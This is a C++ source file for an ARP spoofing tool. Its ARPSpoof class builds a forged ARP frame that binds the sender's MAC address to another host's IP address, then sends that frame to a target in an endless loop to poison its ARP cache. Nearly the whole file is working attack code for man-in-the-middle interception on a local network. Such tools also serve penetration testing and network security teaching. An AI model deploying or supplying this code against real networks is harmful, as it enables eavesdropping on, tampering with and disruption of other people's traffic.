#include <cstring>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <thread>

#include "arp_spoof.h"
#include "ethernet.h"
#include "arp.h"
#include "../utils/mac.h"
#include "settings.h"

ARPSpoof::ARPSpoof(Socket *socket, unsigned char *targetMacAddress, unsigned char *targetIPAddress, unsigned char *destinationIPAddress) {
  this->socket = socket;
  memset(this->buffer, 0, BUFFER_SIZE);
  memcpy(this->targetMacAddress, targetMacAddress, MAC_LENGTH);
  memcpy(this->targetIPAddress, targetIPAddress, IPV4_LENGTH);
  memcpy(this->destinationIPAddress, destinationIPAddress, IPV4_LENGTH);
}

ARPSpoof::~ARPSpoof(){}

void ARPSpoof::makeSpoofData() {
  unsigned char myMacAddress[MAC_LENGTH];
  getMyMacAddress(myMacAddress, getSettings().interfaceName.c_str());
  
  EthernetHeader *ethernetHeader = (EthernetHeader*)this->buffer;
  setEthernetHeader(ethernetHeader, this->targetMacAddress, myMacAddress, ETH_P_ARP);
  ARPHeader *arpHeader = (ARPHeader*)(this->buffer + sizeof(EthernetHeader));
  setARPHeader(arpHeader, ETHERNET_TYPE, ETH_P_IP, MAC_LENGTH, IPV4_LENGTH, ARP_REQUEST, myMacAddress, this->destinationIPAddress, this->targetMacAddress, this->targetIPAddress);
}

void ARPSpoof::spoof(sockaddr_ll *to, int duration) {
  this->makeSpoofData();

  while(true) {
    this->socket->sendTo((sockaddr*)to, sizeof(sockaddr_ll), this->buffer, BUFFER_SIZE);
    std::this_thread::sleep_for(std::chrono::minutes(duration));
  }
}